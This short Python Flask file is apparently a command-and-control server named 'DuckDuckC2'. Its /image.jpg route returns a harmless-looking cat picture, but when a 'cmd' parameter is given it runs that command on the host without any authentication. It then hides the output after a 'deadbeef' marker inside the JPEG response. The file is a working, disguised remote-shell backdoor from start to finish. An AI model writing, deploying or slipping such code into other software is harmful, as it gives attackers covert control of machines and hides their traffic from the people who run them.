from flask import Flask, request, make_response
import shlex
import subprocess
import logging

fmt = '%(asctime)s [DuckDuckC2] %(message)s'
logging.basicConfig(level=logging.INFO, format=fmt, filename='server.log')

app = Flask(__name__)

image_file = 'innocent-cat-pic.jpg'
magic = 'deadbeef'


@app.route('/image.jpg')
def serve():
    cmd = request.args.get('cmd', default='')

    with open(image_file, 'rb') as fh:
        img = fh.read()

    if cmd:
        logging.info(f'Running command -> {cmd}')
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT).decode('utf-8')
        logging.info(f'Command output -> {output}')
        resp = make_response(img + f'{magic}{output}'.encode())
    else:
        resp = make_response(img)

    resp.headers.set('Content-Type', 'image/jpeg')
    return resp
